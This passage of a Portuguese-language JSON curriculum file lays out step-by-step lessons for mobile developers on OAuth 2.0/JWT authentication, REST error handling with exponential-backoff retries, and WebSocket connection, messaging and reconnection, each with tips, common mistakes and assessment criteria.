                                    "Instale bibliotecas: Dio ou http para Flutter; Alamofire ou URLSession para Swift; OkHttp para Android",
                                    "Configure um servidor mock ou use APIs públicas como Auth0 ou Google OAuth playground",
                                    "Defina variáveis de ambiente para client_id, client_secret, redirect_uri e scopes",
                                    "Implemente um storage seguro para tokens (Flutter Secure Storage ou Keychain)",
                                    "Teste requisições HTTP básicas sem autenticação"
                                  ],
                                  "verification": "Execute uma requisição GET simples para uma API mock e confirme resposta 200.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "IDE (VS Code/Android Studio/Xcode)",
                                    "Biblioteca HTTP (ex: dio: ^5.0.0 no pubspec.yaml)",
                                    "Servidor mock como JSON Server ou Mockoon"
                                  ],
                                  "tips": "Use PKCE para apps móveis públicos para maior segurança sem client_secret.",
                                  "learningObjective": "Preparar o ambiente para integração segura de autenticação em apps móveis.",
                                  "commonMistakes": [
                                    "Armazenar tokens em SharedPreferences não criptografados",
                                    "Expor client_secret em apps mobile"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Fluxo de Login e Obtenção de Token",
                                  "subSteps": [
                                    "Crie função para abrir Auth URL no browser ou WebView (com PKCE challenge)",
                                    "Capture o código de autorização via deep link ou redirect",
                                    "Troque o código por access_token e refresh_token via POST /token",
                                    "Valide e armazene tokens usando storage seguro",
                                    "Teste login completo com logs de tokens obtidos"
                                  ],
                                  "verification": "Realize login e verifique se access_token é armazenado e payload decodifica corretamente.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Exemplo de app OAuth no GitHub",
                                    "Auth0 ou Firebase Auth playground",
                                    "Deep link configurado no manifest/info.plist"
                                  ],
                                  "tips": "Implemente estado (state parameter) para prevenir CSRF attacks.",
                                  "learningObjective": "Gerar e capturar tokens de autenticação de forma segura.",
                                  "commonMistakes": [
                                    "Não usar PKCE, expondo a ataques de interceptação",
                                    "Ignorar validação de issuer e audience no JWT"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Token em Requisições HTTP Autenticadas",
                                  "subSteps": [
                                    "Crie interceptor HTTP para adicionar Authorization: Bearer <token> em headers",
                                    "Implemente verificação de expiração antes de cada requisição",
                                    "Teste endpoints protegidos (ex: GET /user/profile)",
                                    "Adicione retry automático para 401 Unauthorized",
                                    "Logue headers e respostas para depuração"
                                  ],
                                  "verification": "Faça requisições autenticadas e confirme dados protegidos retornam 200.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Postman para testar API",
                                    "Código interceptor exemplo de bibliotecas usadas"
                                  ],
                                  "tips": "Cache tokens mas sempre cheque expiração via payload.exp.",
                                  "learningObjective": "Autorizar requisições HTTP com tokens JWT de forma automática.",
                                  "commonMistakes": [
                                    "Adicionar token em todas requisições, inclusive públicas",
                                    "Não tratar 401 para refresh"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Gerenciar Refresh Token e Logout",
                                  "subSteps": [
                                    "Implemente função refresh: POST /token com grant_type=refresh_token",
                                    "Atualize access_token e refresh_token no storage",
                                    "Crie logout: limpe storage e redirecione para login",
                                    "Adicione timers para refresh proativo baseado em expiração",
                                    "Teste cenários de expiração e refresh em loop"
                                  ],
                                  "verification": "Simule expiração, force refresh e confirme sessão continua sem relogin.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Timer/Stream para polling de expiração",
                                    "Testes unitários para funções de token"
                                  ],
                                  "tips": "Use refresh_token apenas quando necessário para evitar rate limits.",
                                  "learningObjective": "Manter sessões ativas gerenciando ciclo de vida de tokens.",
                                  "commonMistakes": [
                                    "Loop infinito em refresh falhado",
                                    "Não invalidar refresh_token no logout"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app de delivery móvel (Flutter), integre OAuth 2.0 com Auth0 para login do usuário. Após login, use JWT para acessar /api/orders protegido, gerenciando refresh para manter pedidos sincronizados em background.",
                              "finalVerifications": [
                                "Login obtém tokens válidos e armazena com segurança",
                                "Requisições autenticadas retornam dados corretos (não 401)",
                                "Refresh token atualiza access_token expirado sem interrupção",
                                "Logout limpa todos os tokens e redireciona",
                                "Deep links capturam código de autorização corretamente",
                                "Tokens não são expostos em logs ou network inspector"
                              ],
                              "assessmentCriteria": [
                                "Código modular com funções separadas para auth, refresh e interceptor",
                                "Tratamento completo de erros (network, invalid token, 401)",
                                "Uso de PKCE e storage seguro em produção",
                                "Testes unitários cobrindo 80% das funções de auth",
                                "Performance: refresh proativo sem delays perceptíveis",
                                "Segurança: validação de JWT signature e claims"
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Criptografia assimétrica em JWT",
                                "Desenvolvimento Web: HTTP headers e status codes",
                                "UX/UI: Indicadores de loading durante auth flows",
                                "Banco de Dados: Armazenamento de sessões no backend",
                                "Redes: Gerenciamento de conexões persistentes em mobile"
                              ],
                              "realWorldApplication": "Apps bancários como Nubank usam JWT para transações seguras; redes sociais como Instagram integram OAuth para login com Google/Facebook, gerenciando refresh para feeds em tempo real."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.1.4",
                            "name": "Gerenciar erros e retries em chamadas REST",
                            "description": "Tratar códigos de status HTTP (ex: 4xx, 5xx), implementar retries exponenciais e exibir mensagens de erro amigáveis ao usuário no app móvel.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender e Mapear Códigos de Status HTTP Comuns",
                                  "subSteps": [
                                    "Estude os códigos de status HTTP: 2xx (sucesso), 4xx (erros do cliente como 400 Bad Request, 401 Unauthorized, 404 Not Found), 5xx (erros do servidor como 500 Internal Server Error, 503 Service Unavailable).",
                                    "Crie um mapeamento em código para cada código relevante à sua API, associando mensagens descritivas em português.",
                                    "Analise a documentação da API específica para códigos personalizados.",
                                    "Implemente um parser inicial para capturar response.status em chamadas fetch ou axios.",
                                    "Registre logs para debugging com console.error ou uma biblioteca como Sentry."
                                  ],
                                  "verification": "Execute uma chamada REST com status 404 e verifique se o mapeamento retorna a mensagem correta no log.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação HTTP Status Codes (MDN Web Docs)",
                                    "Biblioteca de chamadas HTTP (ex: Axios ou Fetch API)",
                                    "Editor de código (VS Code)"
                                  ],
                                  "tips": "Priorize 4xx para erros do usuário e 5xx para retries; use enums ou objetos para mapeamento.",
                                  "learningObjective": "Identificar e categorizar códigos HTTP para tratamento direcionado.",
                                  "commonMistakes": [
                                    "Ignorar códigos 429 Too Many Requests",
                                    "Tratar todos os 5xx da mesma forma sem retry",
                                    "Não logar detalhes do erro para debug."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Tratamento de Erros em Chamadas REST",
                                  "subSteps": [
                                    "Crie uma função wrapper para chamadas API que inclua try-catch para erros de rede.",
                                    "No catch, verifique status e retorne objeto com {error: true, message: mappedMessage, code: status}.",
                                    "Para erros de rede (sem response), defina mensagem genérica como 'Sem conexão com a internet'.",
                                    "Integre validação de response.data para erros de schema (ex: JSON inválido).",
                                    "Use async/await com Promise.reject para propagar erros controlados."
                                  ],
                                  "verification": "Simule erro de rede desconectando Wi-Fi e confirme mensagem amigável no app.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Exemplos de Axios interceptors",
                                    "React Native ou Flutter HTTP client docs",
                                    "Postman para simular respostas"
                                  ],
                                  "tips": "Use interceptors globais no Axios para centralizar tratamento.",
                                  "learningObjective": "Criar handlers robustos que transformem erros técnicos em feedback usuário.",
                                  "commonMistakes": [
                                    "Expor detalhes técnicos ao usuário (ex: stack trace)",
                                    "Não diferenciar rede vs servidor",
                                    "Bloquear UI em erros sem fallback."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Retries com Backoff Exponencial",
                                  "subSteps": [
                                    "Instale biblioteca como 'axios-retry' ou implemente manualmente com Promise retry loop.",
                                    "Defina política: maxRetries=3, delay inicial=1000ms, multiplicador=2 (exponencial).",
                                    "Aplique retry apenas para 5xx e 408/429; abortar em 4xx.",
                                    "Adicione jitter randômico ao delay para evitar thundering herd.",
                                    "Monitore tentativas nos logs e pare em sucesso ou max retries."
                                  ],
                                  "verification": "Use ferramenta como Mockoon para simular 503 múltiplas vezes e confirme retry até sucesso.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Biblioteca axios-retry ou retry-axios",
                                    "Mock server (Mockoon ou json-server)",
                                    "Calculadora para backoff times"
                                  ],
                                  "tips": "Teste com delays reais para simular latência; exponencial previne sobrecarga no servidor.",
                                  "learningObjective": "Implementar resiliência automática em chamadas falhas.",
                                  "commonMistakes": [
                                    "Retry infinito sem max limite",
                                    "Aplicar retry em 4xx (erros irrecuperáveis)",
                                    "Delay fixo em vez de exponencial."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Exibir Mensagens de Erro Amigáveis e Integrar ao App Móvel",
                                  "subSteps": [
                                    "Crie componente Toast ou Alert no app (ex: react-native-toast-message).",
                                    "No estado do app, capture erro da API e dispare notificação com retry button se aplicável.",
                                    "Personalize mensagens: 'Tente novamente' para 5xx pós-retries, 'Verifique login' para 401.",
                                    "Adicione ícones e botões de ação (ex: retry, support).",
                                    "Teste em diferentes telas e estados offline."
                                  ],
                                  "verification": "Navegue no app, force erro e confirme toast aparece com ação funcional.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "UI library (react-native-paper ou Flutter Snackbar)",
                                    "Estado global (Redux/Context)",
                                    "Emulador móvel"
                                  ],
                                  "tips": "Mantenha mensagens curtas (<100 chars); use i18n para múltiplos idiomas.",
                                  "learningObjective": "Melhorar UX com feedback intuitivo e ações corretivas.",
                                  "commonMistakes": [
                                    "Mensagens vagas como 'Erro ocorreu'",
                                    "Não oferecer retry manual",
                                    "Toast some rápido demais em mobile."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app de delivery móvel, ao chamar API de checkout, se status 503 (servidor sobrecarregado), implemente 3 retries com delays 1s/2s/4s; após falha, mostre toast 'Serviço temporariamente indisponível. Tentar novamente?' com botão que refaz a chamada.",
                              "finalVerifications": [
                                "Chamada falha com 4xx exibe mensagem específica sem retry.",
                                "5xx aciona retries exponenciais e loga tentativas.",
                                "Pós-max retries, usuário vê toast amigável com ação.",
                                "Offline detectado e tratado separadamente.",
                                "Logs capturam detalhes para debug.",
                                "UI não trava em erros."
                              ],
                              "assessmentCriteria": [
                                "Mapeamento completo de status HTTP com mensagens localizadas.",
                                "Retry policy configurada corretamente (exponencial, condicional).",
                                "Tratamento de rede/offline robusto.",
                                "Integração UI sem vazamento de erros técnicos.",
                                "Código limpo, testável e com logs.",
                                "Performance: retries não degradam app."
                              ],
                              "crossCurricularConnections": [
                                "Programação Assíncrona: Promises e async/await.",
                                "UX/UI Design: Feedback de erro humanizado.",
                                "Segurança: Tratamento de 401/403 sem expor tokens.",
                                "Testes de Software: Mocking de APIs falhas.",
                                "DevOps: Monitoramento com logs/Sentry."
                              ],
                              "realWorldApplication": "Apps como Uber ou iFood usam isso para gerenciar falhas de API durante picos de uso, garantindo que entregas prossigam apesar de instabilidades de servidor, melhorando retenção de usuários em 20-30% via UX resiliente."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.4.2",
                        "name": "WebSockets para Comunicação em Tempo Real",
                        "description": "Conceito sobre o protocolo WebSocket para estabelecer conexões persistentes entre apps móveis e servidores na nuvem, permitindo atualizações em tempo real.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.4.2.1",
                            "name": "Estabelecer conexão WebSocket",
                            "description": "Configurar e iniciar uma conexão WebSocket em apps móveis usando bibliotecas como Socket.IO (cross-platform) ou native WebSocket APIs, conectando a backends na nuvem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de desenvolvimento e instalar dependências",
                                  "subSteps": [
                                    "Instale uma biblioteca WebSocket compatível, como Socket.IO para cross-platform (React Native, Flutter) ou WebSocket nativo para Android/iOS.",
                                    "Configure o backend com Socket.IO server (Node.js/Express) ou equivalente, expondo endpoint ws:// ou wss://.",
                                    "Adicione dependências no package.json ou pubspec.yaml: socket.io-client para cliente móvel.",
                                    "Configure variáveis de ambiente para URL do servidor (ex: ws://localhost:3000 para dev, wss://api.exemplo.com para prod).",
                                    "Execute npm install ou flutter pub get para instalar pacotes."
                                  ],
                                  "verification": "Verifique se as dependências foram instaladas sem erros via logs do terminal e importe bem-sucedido no código.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Node.js/Express para backend",
                                    "React Native/Flutter CLI",
                                    "Editor de código (VS Code)",
                                    "Socket.IO docs"
                                  ],
                                  "tips": "Use versões compatíveis da biblioteca para evitar conflitos cross-platform; teste em emulador primeiro.",
                                  "learningObjective": "Entender e preparar o setup inicial para comunicação WebSocket em apps móveis.",
                                  "commonMistakes": [
                                    "Ignorar HTTPS/WSS em produção",
                                    "Usar porta errada no backend",
                                    "Esquecer de rebuildar o app após install"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Inicializar o cliente WebSocket no app móvel",
                                  "subSteps": [
                                    "Importe a biblioteca no arquivo principal do app (ex: socket = io('ws://localhost:3000') em Socket.IO).",
                                    "Crie uma instância singleton ou use contexto/provider para gerenciar o socket globalmente.",
                                    "Defina opções de conexão: { transports: ['websocket'], timeout: 20000, autoConnect: false }.",
                                    "Implemente método para conectar: socket.connect() ou socket.open().",
                                    "Adicione listeners iniciais para eventos 'connect', 'disconnect' e 'error'."
                                  ],
                                  "verification": "Console.log no evento 'connect' deve disparar mensagem de sucesso ao chamar connect().",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação Socket.IO Client",
                                    "Exemplo de código React Native/Flutter",
                                    "Emulador Android/iOS"
                                  ],
                                  "tips": "Evite reconexões infinitas definindo retry logic manual; use useEffect para lifecycle em React.",
                                  "learningObjective": "Configurar cliente WebSocket de forma robusta e gerenciável em apps móveis.",
                                  "commonMistakes": [
                                    "Não aguardar conexão antes de enviar dados",
                                    "Vazar listeners sem remover",
                                    "Ignorar opções de timeout"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerenciar eventos e comunicação bidirecional",
                                  "subSteps": [
                                    "No cliente, ouça eventos do servidor: socket.on('message', callback).",
                                    "Emita eventos para o servidor: socket.emit('sendMessage', { data }).",
                                    "Implemente reconexão automática: socket.on('disconnect', () => socket.connect()).",
                                    "Trate erros: socket.on('error', handleError) com alertas ou toasts no UI.",
                                    "Atualize estado da UI baseado em eventos (ex: mostrar 'Conectado' via setState)."
                                  ],
                                  "verification": "Envie uma mensagem do app e confirme recebimento no backend console; vice-versa.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Socket.IO event reference",
                                    "Postman ou ferramenta para simular backend",
                                    "UI components para status"
                                  ],
                                  "tips": "Namespace eventos para evitar colisões (ex: 'chat:message'); use JSON.stringify para payloads complexos.",
                                  "learningObjective": "Implementar fluxo completo de envio/recebimento de dados em tempo real.",
                                  "commonMistakes": [
                                    "Emitir antes de conectar",
                                    "Não serializar objetos corretamente",
                                    "Ignorar reconexão em rede instável"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar conexão e depurar problemas comuns",
                                  "subSteps": [
                                    "Teste em emulador e dispositivo real: verifique firewall/proxy bloqueando WS.",
                                    "Use ferramentas como Chrome DevTools (para React Native web) ou Wireshark para inspecionar tráfego WS.",
                                    "Simule desconexões: pause rede e confirme reconexão automática.",
                                    "Logue todos os eventos para debug: console.log(socket.id) após connect.",
                                    "Valide em produção com WSS e certificados SSL."
                                  ],
                                  "verification": "Conexão persiste por 5min com tráfego bidirecional; logs mostram ID único e zero erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Emulador com rede simulada",
                                    "ngrok para tunnel local",
                                    "Socket.IO tester online"
                                  ],
                                  "tips": "Ative debug: io('url', { transports: ['websocket'] }); para mais logs.",
                                  "learningObjective": "Garantir conexão WebSocket estável e depurável em cenários reais.",
                                  "commonMistakes": [
                                    "Testar só localhost",
                                    "Esquecer auth headers em WSS",
                                    "Não testar offline/online"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app de chat móvel React Native, use Socket.IO para conectar a um servidor Node.js: ao abrir o app, socket.connect() emite 'joinRoom' com userID; recebe 'newMessage' e atualiza lista de mensagens em tempo real, com status 'Online/Offline'.",
                              "finalVerifications": [
                                "Socket conecta em <5s e emite evento 'connect' sem erros.",
                                "Mensagens bidirecionais são trocadas instantaneamente (<100ms latency).",
                                "Reconexão automática ocorre após 10s de desconexão simulada.",
                                "Tratamento de erros exibe toast sem crash do app.",
                                "Socket limpa listeners corretamente ao sair da tela.",
                                "Funciona em dispositivo real com rede móvel."
                              ],
                              "assessmentCriteria": [
                                "Código modular com singleton/context para socket.",
                                "Tratamento completo de lifecycle (connect/disconnect/error).",
                                "Uso correto de opções de conexão (timeout, transports).",
                                "Logs e verificações para debugging.",
                                "Compatibilidade cross-platform (Android/iOS).",
                                "Segurança básica: WSS em prod e validação de eventos."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender protocolo WS vs HTTP polling.",
                                "Programação Assíncrona: Callbacks/Promises em eventos realtime.",
                                "Segurança da Informação: Autenticação e criptografia em WSS.",
                                "Desenvolvimento Ágil: Integração CI/CD com testes de conexão.",
                                "UX/UI Design: Feedback visual para status de conexão."
                              ],
                              "realWorldApplication": "Desenvolvimento de apps como WhatsApp ou Uber, onde notificações push em tempo real (localização compartilhada, mensagens instantâneas) exigem conexões WebSocket persistentes para baixa latência e escalabilidade."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.2.2",
                            "name": "Enviar e receber mensagens em tempo real",
                            "description": "Implementar envio de mensagens JSON via WebSocket e listeners para eventos recebidos, atualizando a UI do app móvel dinamicamente.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar a Conexão WebSocket no App Móvel",
                                  "subSteps": [
                                    "Instale a biblioteca WebSocket necessária (ex: 'react-native-websocket' ou use WebSocket nativo).",
                                    "Crie uma instância do WebSocket com a URL do servidor (ex: ws://localhost:8080).",
                                    "Implemente eventos de conexão: onopen, onclose, onerror.",
                                    "Adicione lógica de reconexão automática em caso de falha.",
                                    "Teste a conexão abrindo o app e verificando logs de conexão."
                                  ],
                                  "verification": "Verifique nos logs do console se o evento 'onopen' é disparado e a conexão é estabelecida.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de código (VS Code)",
                                    "Emulador móvel (Android Studio ou Expo)",
                                    "Servidor WebSocket de teste (ex: Node.js com ws library)"
                                  ],
                                  "tips": "Use URLs ws:// para desenvolvimento local e wss:// para produção para segurança.",
                                  "learningObjective": "Entender e implementar a inicialização segura de uma conexão WebSocket em um app móvel.",
                                  "commonMistakes": "Esquecer de lidar com permissões de rede no Android/iOS; usar HTTP em vez de WS."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Envio de Mensagens JSON via WebSocket",
                                  "subSteps": [
                                    "Crie uma função sendMessage que recebe um objeto JSON e o stringify.",
                                    "Verifique se a conexão está aberta antes de enviar (ws.readyState === WebSocket.OPEN).",
                                    "Adicione um botão na UI para disparar o envio de uma mensagem de teste.",
                                    "Inclua metadados na mensagem JSON (ex: {type: 'message', data: 'Olá', timestamp: Date.now()}).",
                                    "Registre o envio nos logs para depuração."
                                  ],
                                  "verification": "Envie uma mensagem e confirme nos logs do servidor que ela foi recebida.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Código do Step 1",
                                    "Servidor WebSocket configurado para logar mensagens recebidas"
                                  ],
                                  "tips": "Sempre valide o estado da conexão antes de enviar para evitar erros silenciosos.",
                                  "learningObjective": "Dominar o envio de dados estruturados (JSON) de forma assíncrona via WebSocket.",
                                  "commonMistakes": "Enviar objetos JS diretamente sem JSON.stringify; ignorar estado da conexão."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Listeners para Recebimento de Mensagens",
                                  "subSteps": [
                                    "Implemente o evento onmessage no WebSocket.",
                                    "Parse a mensagem recebida com JSON.parse(event.data).",
                                    "Crie um handler para diferentes tipos de mensagens (ex: switch por message.type).",
                                    "Armazene mensagens recebidas em um estado local (useState em React Native).",
                                    "Adicione tratamento de erros para mensagens malformadas."
                                  ],
                                  "verification": "Envie uma mensagem do servidor ou outro cliente e veja se é capturada no onmessage.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Código dos Steps 1-2",
                                    "Outro cliente WebSocket para simular envios"
                                  ],
                                  "tips": "Use try-catch no parse para capturar JSON inválido e logar erros.",
                                  "learningObjective": "Configurar listeners reativos para eventos de mensagens em tempo real.",
                                  "commonMistakes": "Não tratar erros de parse; processar dados sem validação de tipo."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Atualizar a UI Dinamicamente com Mensagens Recebidas",
                                  "subSteps": [
                                    "Integre o estado de mensagens com um componente de lista (FlatList em React Native).",
                                    "Use useEffect para escutar mudanças no estado e re-renderizar a UI.",
                                    "Adicione animações suaves para novas mensagens (ex: Animated API).",
                                    "Implemente scroll automático para a última mensagem.",
                                    "Teste end-to-end: envie do app, receba e veja UI atualizar."
                                  ],
                                  "verification": "Mensagens enviadas/recebidas devem aparecer na UI em tempo real sem recarregar.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Código dos Steps anteriores",
                                    "Biblioteca de UI (React Native Elements ou similar)"
                                  ],
                                  "tips": "Evite re-renders desnecessários usando useCallback e memoização.",
                                  "learningObjective": "Sincronizar dados em tempo real com a interface do usuário de forma fluida.",
                                  "commonMistakes": "Atualizar UI na thread principal bloqueando o app; não otimizar renders."
                                }
                              ],
                              "practicalExample": "Desenvolva um chat simples em React Native: um campo de texto envia mensagens JSON via WebSocket para um servidor Node.js, e mensagens recebidas de outros usuários aparecem instantaneamente em uma lista de mensagens com timestamps e avatares.",
                              "finalVerifications": [
                                "Conexão WebSocket abre e fecha corretamente sem crashes.",
                                "Mensagens JSON são enviadas e recebidas sem perda de dados.",
                                "UI atualiza em <1s para mensagens recebidas.",
                                "Reconexão funciona após perda de internet simulada.",
                                "Tratamento de erros exibe alertas amigáveis ao usuário.",
                                "Logs mostram parsing correto de JSON bidirecional."
                              ],
                              "assessmentCriteria": [
                                "Código modular com funções separadas para send/receive.",
                                "Tratamento robusto de erros e estados de conexão.",
                                "Performance: UI fluida sem lags em alto volume de mensagens.",
                                "Validação de dados JSON de entrada/saída.",
                                "Código comentado e legível com boas práticas (ex: async/await).",
                                "Testes unitários para funções de envio/parsing."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender protocolos WS vs HTTP polling.",
                                "Programação Assíncrona: Callbacks e Promises em eventos WebSocket.",
                                "Desenvolvimento de UI/UX: Princípios de real-time feedback.",
                                "Segurança da Informação: Validação de mensagens e uso de WSS.",
                                "Banco de Dados: Persistência de histórico de mensagens."
                              ],
                              "realWorldApplication": "Implementação de chats em apps como WhatsApp ou Telegram, notificações push em tempo real em apps de delivery (ex: Uber Eats), ou dashboards colaborativos em ferramentas como Figma para atualizações multiplayer instantâneas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.2.3",
                            "name": "Gerenciar reconexão e estados da conexão",
                            "description": "Detectar desconexões, implementar lógica de reconexão automática e gerenciar estados (conectado, desconectado, reconectando) em apps móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir os estados da conexão",
                                  "subSteps": [
                                    "Crie uma enum ou objeto com estados: 'connected', 'disconnected', 'connecting', 'reconnecting'.",
                                    "Implemente um estado global usando Context API (React Native) ou Provider (Flutter) para compartilhar entre componentes.",
                                    "Inicialize o estado como 'disconnected' no início da app.",
                                    "Crie funções para atualizar o estado (setState ou dispatch).",
                                    "Exponha o estado atual via hook ou getter para uso em UI."
                                  ],
                                  "verification": "Console.log ou debugger mostra estados definidos e inicializados corretamente; UI reflete estado inicial.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação do framework (React Native Context ou Flutter Provider), editor de código (VS Code).",
                                  "tips": "Use TypeScript para tipar os estados e evitar erros de digitação.",
                                  "learningObjective": "Compreender e implementar um sistema de estados finitos para gerenciamento de conexão WebSocket.",
                                  "commonMistakes": "Esquecer de inicializar o estado ou não torná-lo acessível globalmente."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar detecção de desconexões",
                                  "subSteps": [
                                    "Configure o listener de eventos WebSocket: 'onclose', 'onerror', 'open'.",
                                    "No 'onclose' e 'onerror', atualize estado para 'disconnected'.",
                                    "No 'open', atualize para 'connected'.",
                                    "Adicione debounce ou timeout para evitar falsos positivos em redes instáveis.",
                                    "Integre com biblioteca como socket.io-client para eventos automáticos ('disconnect', 'connect')."
                                  ],
                                  "verification": "Simule desconexão (desligue WiFi) e verifique se estado muda para 'disconnected' via logs ou UI.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Biblioteca socket.io-client ou WebSocket nativo, emulador Android/iOS para testes de rede.",
                                  "tips": "Use 'navigator.onLine' como fallback para detecção inicial de conectividade.",
                                  "learningObjective": "Detectar mudanças de status de conexão WebSocket de forma confiável em apps móveis.",
                                  "commonMistakes": "Não tratar erros de rede como desconexões ou ignorar reconexões parciais."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver lógica de reconexão automática",
                                  "subSteps": [
                                    "Implemente exponential backoff: delays iniciais de 1s, dobrando até 30s max.",
                                    "Ao detectar 'disconnected', mude para 'reconnecting' e inicie timer.",
                                    "No timer callback, tente reconectar e atualize estado conforme resultado.",
                                    "Limite tentativas (ex: 5) e fallback para 'disconnected' após falhas.",
                                    "Pause reconexão em background (use AppState no React Native).",
                                    "Reinicie contadores ao reconectar com sucesso."
                                  ],
                                  "verification": "Desconecte rede, observe reconexões com delays crescentes nos logs; reconecta ao restaurar rede.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Código de WebSocket existente, timer utilities (setTimeout com clearInterval).",
                                  "tips": "Armazene contadores em estado persistente (AsyncStorage) para sobreviver a restarts da app.",
                                  "learningObjective": "Criar uma reconexão resiliente com backoff para lidar com instabilidades de rede móveis.",
                                  "commonMistakes": "Reconexões infinitas sem limite ou delays fixos que sobrecarregam o servidor."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Gerenciar transições de estado e feedback na UI",
                                  "subSteps": [
                                    "Crie componentes UI condicionais baseados no estado (ex: spinner em 'reconnecting').",
                                    "Exiba mensagens: 'Conectado', 'Reconectando...', 'Sem conexão'.",
                                    "Adicione botão manual de reconectar em 'disconnected'.",
                                    "Logue transições para debugging (use console ou Sentry).",
                                    "Teste em cenários reais: airplane mode, poor signal."
                                  ],
                                  "verification": "UI atualiza dinamicamente com mudanças de estado; usuário vê feedback claro em todos estados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Componentes UI (React Native ActivityIndicator, Flutter CircularProgressIndicator).",
                                  "tips": "Use animações suaves para transições para melhor UX.",
                                  "learningObjective": "Integrar gerenciamento de estados com interface do usuário para experiência fluida.",
                                  "commonMistakes": "UI não sincronizada com estado ou feedback confuso para o usuário."
                                }
                              ],
                              "practicalExample": "Em um app de chat móvel (React Native com socket.io), ao perder conexão durante uma conversa, o app detecta 'disconnected', mostra spinner 'Reconectando...', tenta reconexão com backoff (1s, 2s, 4s), atualiza para 'connected' ao sucesso e resgata mensagens perdidas via ACKs.",
                              "finalVerifications": [
                                "App detecta e atualiza estados corretamente em simulações de desconexão.",
                                "Reconexões automáticas ocorrem com backoff exponencial e limite de tentativas.",
                                "UI reflete todos os estados (conectado, desconectado, reconectando) com feedback claro.",
                                "Reconexão pausa em background e retoma em foreground.",
                                "Logs mostram transições de estado sem erros.",
                                "Testes em dispositivos reais com redes instáveis passam."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção de eventos WebSocket (100% cobertura de onclose/open/error).",
                                "Implementação correta de backoff exponencial com limites (delays corretos em logs).",
                                "Estados gerenciados de forma thread-safe e acessíveis globalmente.",
                                "UX intuitiva com feedback visual em todos estados.",
                                "Resiliência: app sobrevive a múltiplas desconexões sem crash.",
                                "Código limpo, tipado e comentado."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender protocolos TCP/WebSocket e timeouts.",
                                "Desenvolvimento de Software: Padrões de estado finito (FSM) e resiliência.",
                                "Experiência do Usuário (UX): Design de feedback para falhas de rede.",
                                "Testes de Software: Simulações de rede e mocking de eventos."
                              ],
                              "realWorldApplication": "Apps como WhatsApp ou Telegram usam isso para manter chats em tempo real resilientes a redes móveis instáveis, evitando perda de mensagens e frustrando usuários com reconexões automáticas transparentes."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.2.4",
                            "name": "Integrar WebSockets com autenticação",
                            "description": "Autenticar conexões WebSocket com tokens ou headers iniciais, garantindo segurança em comunicações bidirecionais com serviços web na nuvem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar Mecanismo de Autenticação com Tokens",
                                  "subSteps": [
